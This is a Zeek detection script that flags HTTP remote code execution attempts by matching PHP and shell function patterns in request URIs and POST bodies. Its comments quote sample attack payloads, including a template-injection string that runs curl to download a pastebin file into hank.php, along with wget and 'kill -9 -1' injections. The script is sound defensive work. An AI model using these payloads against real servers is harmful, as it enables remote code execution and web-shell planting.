##! Detect HTTP Remote Code Execution attempts.

# Thoughts on how to improve this
# Extract the URL, domain, or host used in the RCE for use in threat intelligence. 

module HTTP_RCE;


export {
    redef enum Notice::Type += {
        ## Indicates that a host performing RCE attacks was
        ## detected.
        RCE_Attacker,
        ## Indicates that a host was seen to have RCE attacks
        ## against it.  This is tracked by IP address as opposed to
        ## hostname.
        RCE_Victim,
        
    };

    redef enum HTTP::Tags += {
        ## Indicator of a URI based RCE attack.
        URI_RCE,
        ## Indicator of client body based RCE attack.  This is
        ## typically the body content of a POST request. Not implemented yet.
        POST_RCE,
        ## Indicator of a cookie based RCE attack. Not implemented yet.
        COOKIE_RCE,
    };

																																		 
															

    ## The threshold and interval may seem high, but from what has been observed attempts sporadically happen over a long period of time.
    ## I am unsure what impact this may have on Zeek though.

    ## Defines the threshold that determines if an RCE attack
    ## is ongoing based on the number of requests that appear to be
    ## RCE attacks.
    const rce_requests_threshold: double = 3.0 &redef;

    ## Interval at which to watch for the
    ## :zeek:id:`HTTP::rce_requests_threshold` variable to be crossed.
    ## At the end of each interval the counter is reset.
    const rce_requests_interval = 120min &redef;

    ## Collecting samples will add extra data to notice
    ## by collecting some sample RCE url paths.  Disable
    ## sample collection by setting this value to 0.
    const collect_RCE_samples = 3 &redef;

    ## Regular expression is used to match URI and post_body based RCEs.
    ## Currently these are geared toward PHP.
    ## Need to look at including C# and Java more.
    ## Future things to think about:
																												
    ## Create a confidence index or scoring system. If we see <?php that's higher confidence than a semi-colon or 1337.
    ## The plus + symbol represents a whitespace character. One technique observed is using a lot of whitespace characters, ie +++++++++++++++++++++++++eval++++++++++++++++++++(
    ## Not sure on the "unsafe", "curl" regex entries below yet. Need to make it more specific to avoid false positives.


    ## The idea with the included regex below is to focus on patterns that will almost always accompany an RCE.
    ## There are a many ways to obfuscate and many vulnerabilities to exploit.
    ## Only a handful of functions that can be used to begin the deobfuscating process and run the code. Keeps this simple.																																							   
																											
    const match_rce_pattern =

    /(eval[[:space:]]*\+*\()/i |
    /(\$_POST\[)/ |
    /(\$_GET\[)/ |
    /(\$_FILES\[)/ |
    /(\$_REQUEST\[)/ |
    /(\<\?php)/i |
    /(echo[[:space:]]*\+*(\"|\\'|\"))/i |
    /(exec[[:space:]]*\+*\()/i |
    /(base64_decode[[:space:]]*\+*\()/i | 
    /(FromBase64String[[:space:]]*\+*\()/i |
    /(copy[[:space:]]*\+*\()/i |
    /(md5[[:space:]]*\+*\()/i |
    /(system[[:space:]]*\+*\()/i |
    /(gzinflate[[:space:]]*\+*\()/i |
    /(die[[:space:]]*\+*\()/i |
    /(fwrite[[:space:]]*\+*\()/i |
    /(fopen[[:space:]]*\+*\()/i |
    /(preg_replace[[:space:]]*\+*\()/i |
    /(str_replace[[:space:]]*\+*\()/i |
    /(file_get_contents[[:space:]]*\+*\()/i |
    /(PHP Obfuscator)/ |
    # /(\?\>)/ | Legitimate XML Ending
    # /(\%\>)/ | Too many false positives.
    /(curl[[:space:]]+)/i | # Need to make this more specific. # Example: [#markup]=curl%20https:// #Could look for a domain, IP, or protocol afterwards.
    /(curl_init[[:space:]]*\()/i |
    /(wget[[:space:]]+)/i | # Need to make this more specific. # Example: [#markup]=wget -qO - http://
    #/(shell)/i | # Need to make this more specific. powershell? or shell.<extension> such as shell.php. Too many false positives with just "shell"
    #/(unsafe)/i # Need to make this more specific. 

    # Functions that are candidates to be included, but disabled due to needing more data.
    #str_rot13 #Example: base64_decode(str_rot13(strrev('=Nj/8C+2NKkj8L
    #strrev #Example: base64_decode(str_rot13(strrev('=Nj/8C+2NKkj8L
    #urldecode #Example: HwEbwH=urldecode("%6E1%7A%62
    #__FILE__) #Example: <?php define('UztpJp0914',__FILE__);$HwEbwH
    #evaluateDynamicContent # Example: uri={{craft.app.view.evaluateDynamicContent('print(system("curl https://pastebin.com/raw/Tm4k3Ky3 > hank.php"));')}}
    #kill #Example: [#markup]=kill -9 -1;
    #file_get_contents #Example: $code = file_get_contents('https://pastebin[.]com/raw/63LjCNAs');

    # Could also look for plaintext sites known for code:
        # pastbin.com 
        # raw.githubusercontent.com
        # etc

     &redef;


}


function format_rce_samples(samples: vector of SumStats::Observation): string
    {
    local ret = "RCE samples\n---------------------";
    for ( i in samples )
        ret += "\n\n" + samples[i]$str;
    return ret;
    }

event zeek_init()
    {
    # Add filters to the metrics so that the metrics framework knows how to
    # determine when it looks like an attacker and how to respond when
    # thresholds are crossed.
    local r1: SumStats::Reducer = [$stream="http.rce.attacker", $apply=set(SumStats::SUM, SumStats::SAMPLE), $num_samples=collect_RCE_samples];
    SumStats::create([$name="detect-rce-attackers",
              $epoch=rce_requests_interval,
              $reducers=set(r1),
              $threshold_val(key: SumStats::Key, result: SumStats::Result) =
                {
                return result["http.rce.attacker"]$sum;
                },
              $threshold=rce_requests_threshold,
              $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =
                {
                local r = result["http.rce.attacker"];
                NOTICE([$note=RCE_Attacker,
                    $msg="An RCE attacker was discovered!",
                    $sub=vector(format_rce_samples(r$samples))[0],
                    $src=key$host,
                    $identifier=cat(key$host)]);
                }]);

    local r2: SumStats::Reducer = [$stream="http.rce.victim", $apply=set(SumStats::SUM, SumStats::SAMPLE), $num_samples=collect_RCE_samples];
    SumStats::create([$name="detect-rce-victims",
              $epoch=rce_requests_interval,
              $reducers=set(r2),
              $threshold_val(key: SumStats::Key, result: SumStats::Result) =
                {
                return result["http.rce.victim"]$sum;
                },
              $threshold=rce_requests_threshold,
              $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =
                {
                local r = result["http.rce.victim"];
                NOTICE([$note=RCE_Victim,
                    $msg="An RCE victim was discovered!",
                    $sub=vector(format_rce_samples(r$samples))[0],
                    $src=key$host,
                    $identifier=cat(key$host)]);
                }]);
    }

event http_request(c: connection, method: string, original_URI: string,
           unescaped_URI: string, version: string)
{

    #If RCE attempt is found, we want to tag the HTTP log and increment sumstats
    if(c$id$resp_h in Site::local_nets)
    {
        if ( match_rce_pattern in unescaped_URI )
										   
        {
													 
			 
            add c$http$tags[URI_RCE];
            SumStats::observe("http.rce.attacker", [$host=c$id$orig_h], [$str=original_URI]);
            SumStats::observe("http.rce.victim",   [$host=c$id$resp_h], [$str=original_URI]);
			 
        }
    }
}
event http_reply(c: connection, version: string, code: count, reason: string)
{
    # Efficiency technique. RCE attempts against the local nets are more risky.
    if(c$id$resp_h in Site::local_nets)
    {
        if (c$http?$post_body)
        {
            # The post_body field should already be written to the log at this point. We use the log so that
            # the we only process the packets once (by the post_body script). By default, the post_body script writes out 
            # the first 1024 bytes which is sufficient to detect most RCE attempts.
            if ( match_rce_pattern in c$http$post_body )
            {
                add c$http$tags[POST_RCE];
                SumStats::observe("http.rce.attacker", [$host=c$id$orig_h], [$str=c$http$post_body]);
                SumStats::observe("http.rce.victim",   [$host=c$id$resp_h], [$str=c$http$post_body]);
            }
        }
    }
}